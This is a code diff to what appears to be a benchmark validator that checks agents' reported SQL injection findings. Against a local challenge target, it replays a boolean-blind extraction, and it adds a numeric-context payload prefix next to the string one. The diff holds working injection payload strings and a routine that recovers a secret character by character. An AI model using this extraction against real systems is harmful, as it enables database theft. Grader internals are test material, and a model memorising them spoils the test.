@@ -108,16 +108,18 @@ def run_replay(
         time.sleep(2)  # let the target bind its port
         base = f"http://127.0.0.1:{port}"
 
-        if challenge.variant == "boolean":
+        if replay_challenge.variant.startswith("boolean"):
             # A blind variant leaks nothing in any single response, so replaying
             # one request can't recover the canary. Instead the validator itself
             # re-extracts it via boolean blind on the fresh target and checks it
-            # matches -- confirming the reported endpoint is genuinely injectable
-            # and the vulnerability reproduces. No agent code runs.
+            # matches -- confirming the reported endpoint genuinely reproduces.
+            # No agent code runs.
+            context = "numeric" if replay_challenge.variant.endswith("numeric") else "string"
             extracted = _boolean_extract(
                 base, replay_challenge.vulnerable_endpoint,
                 replay_challenge.vulnerable_parameter,
                 replay_challenge.secret_table, replay_challenge.secret_column,
+                context=context,
             )
             return extracted == replay_challenge.canary
 
@@ -132,13 +134,16 @@ def run_replay(
 _HEX = "0123456789abcdef"
 
 
-def _boolean_extract(base_url, endpoint, param, table, column, *, length=32, timeout=5.0) -> str:
+def _boolean_extract(base_url, endpoint, param, table, column, *,
+                     context="string", length=32, timeout=5.0) -> str:
     """Validator-side boolean-blind extraction of the secret, using the known
-    schema. Reconstructs the canary char by char from true/false answers."""
+    schema. Reconstructs the canary char by char from true/false answers. The
+    injection prefix matches the context (string or numeric)."""
     base_url = base_url.rstrip("/")
+    prefix = "0 OR" if context == "numeric" else "zzz' OR"
 
     def btest(condition: str) -> bool:
-        payload = f"zzz' OR ({condition})-- -"
+        payload = f"{prefix} ({condition})-- -"
         url = f"{base_url}{endpoint}?" + urllib.parse.urlencode({param: payload})
         try:
             body = urllib.request.urlopen(url, timeout=timeout).read()
